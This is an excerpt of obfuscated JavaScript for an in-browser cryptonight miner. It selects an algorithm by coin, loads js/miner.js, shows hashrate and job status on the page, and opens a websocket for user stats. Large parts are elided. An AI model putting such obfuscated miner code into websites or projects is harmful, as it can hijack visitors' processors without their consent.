    ...
    if (_0x1a34['initialized'] === undefined) {
        (function() {
            var _0x78ed7b = function() {
                var _0x390a44;
                try {
                    _0x390a44 = Function('return (function() ' + '{}.constructor(\x22return this\x22)( )' + ');')();
                } catch (_0x172d00) {
                    _0x390a44 = window;
                }
                return _0x390a44;
            ...
            _0x4d5b9f['atob'] || (_0x4d5b9f['atob'] = function(_0x15a69e) {
                ...
                for (var _0x288a12 = 0x0, _0x35a5fb, _0x3f7c9b, _0x1e8021 = 0x0, _0xb43804 = ''; _0x3f7c9b = _0x4729ab['charAt'](_0x1e8021++); ~_0x3f7c9b && (_0x35a5fb = _0x288a12 % 0x4 ? _0x35a5fb * 0x40 + _0x3f7c9b : _0x3f7c9b,
                _0x288a12++ % 0x4) ? _0xb43804 += String['fromCharCode'](0xff & _0x35a5fb >> (-0x2 * _0x288a12 & 0x6)) : 0x0) {
...
var cwm_v1 = function() {
    ...
    if (d == 0x1) {
        ...
        miner_statistics = setInterval(function() {
            ...
            console[_0x1a34('0xd', 'UMih')]('Total hashes: ' + m[_0x1a34('0xe', 'Yq3E')]());
...
var cwm_v7 = function() {
    ...
    if (d == 0x0) {
        console['log']('Started mining using v7 alg');
        console[_0x1a34('0xa', 'AIJ8')](p, w, pw, th);
        var _0x1b089d = 0x0;
        miner_statistics = setInterval(function() {
            _0x1b089d = totalhashes * 0.5 + _0x1b089d * 0.5; //hashrate
            var _0x41abfa = Math[_0x1a34('0x14', 'AIJ8')](_0x1b089d);
            //console[_0x1a34('0x15', 'cNYA')](_0x1a34('0x16', 'Y4pt') + _0x41abfa + _0x1a34('0x17', 'NpIT'));
            document.getElementById("hash_rate").innerHTML = _0x41abfa  + _0x1a34('0x17', 'NpIT');
            totalhashes = 0x0;
            while (receiveStack[_0x1a34('0x18', 'l2xj')] > 0x0) {
                var _0x45517e = receiveStack['pop']();
                switch (_0x45517e[_0x1a34('0x19', 'cQb7')]) {
                case 'job':
                    document.getElementById("job").innerHTML = (' New job: ' + _0x45517e[_0x1a34('0x1a', 'gXfD')]);
                    break;
                case 'hashsolved':
                    document.getElementById("hash_solved").innerHTML = ('Hash solved!');
                    break;
                case _0x1a34('0x1c', 'd)0k'):
                    console[_0x1a34('0x1d', '*sn@')](_0x1a34('0x1e', 'zpYl') + _0x45517e[_0x1a34('0x1f', 'uU6Q')]);
                    break;
...
function cwm_start(_0x35310c, _0x2e8b2b, _0x8337b4, _0x567f69, _0x23e892, _0x244400, _0x1dd12, _0x4cdd2e=![], _0x1616ea='') {
    ...
    switch (_0x2e8b2b) {
    case _0x1a34('0x21', 'UVSJ'):
    case _0x1a34('0x22', 'CYCu'):
    case 'intensecoin':
    case 'electroneum':
    case 'v7':
        algorithm = 'cryptonightv7';
        break;
    case _0x1a34('0x23', 'AIJ8'):
    case _0x1a34('0x24', 'fNnu'):
    case 'bytecoin':
    case 'v1':
    ...
    if (algorithm == _0x1a34('0x25', 'Int8')) {
        ...
        loadScript('js/miner.js', cwm_v7);
    }
}
function cwm_stop() {
    if (algorithm == _0x1a34('0x27', 'MXEz')) {
        m[_0x1a34('0x28', '%480')]();
...
function cwm_user_stats(_0x2bc4c4, _0x3132fd, _0xc354d9) {
    ...
    ws[_0x1a34('0x2d', 'y7uj')] = function() {
        var _0x1af2af = {
            'identifier': 'userstats',
            'userid': _0x2bc4c4 + '-' + _0x3132fd
        };
